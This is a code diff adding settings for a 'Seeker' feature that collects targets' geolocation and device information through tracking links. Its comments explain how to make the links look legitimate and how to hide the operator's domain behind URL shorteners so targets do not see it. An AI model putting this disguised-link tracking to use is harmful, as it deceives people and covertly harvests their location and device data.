@@ -154,6 +154,22 @@ class Settings(BaseSettings):
     # Frontend URL for email links (password reset, etc.)
     FRONTEND_URL: str = os.getenv("FRONTEND_URL", "https://your-app.com")
 
+    # Seeker geolocation/device-info collection
+    SEEKER_ENABLED: bool = os.getenv("SEEKER_ENABLED", "true").lower() in (
+        "true",
+        "1",
+        "yes",
+    )
+    SEEKER_IP_RECON_SERVICE: str = os.getenv("SEEKER_IP_RECON_SERVICE", "ipwhois")
+    # ipwhois = ipwhois.app (free, no key) | vpnapi = VPNAPI.io (requires VPNAPI_IO_API_KEY)
+    # Short URL domain for seeker links (e.g. https://links.example.com) - use your own domain
+    # for legitimate-looking links. If unset, uses same server: {base_url}/l/{shortCode}
+    SEEKER_SHORT_URL_DOMAIN: str = os.getenv("SEEKER_SHORT_URL_DOMAIN", "")
+    # Anonymize URLs via external service - target sees v.gd/is.gd/tinyurl, NOT grosint.com
+    # v.gd | is.gd = free, no key | tinyurl = needs TINYURL_API_KEY
+    SEEKER_ANONYMIZE_URL_SERVICE: str = os.getenv("SEEKER_ANONYMIZE_URL_SERVICE", "")
+    TINYURL_API_KEY: str = os.getenv("TINYURL_API_KEY", "")
+
     @field_validator("CORS_ORIGINS", mode="before")
     @classmethod
     def assemble_cors_origins(cls, v: str | list[str]) -> list[str]:
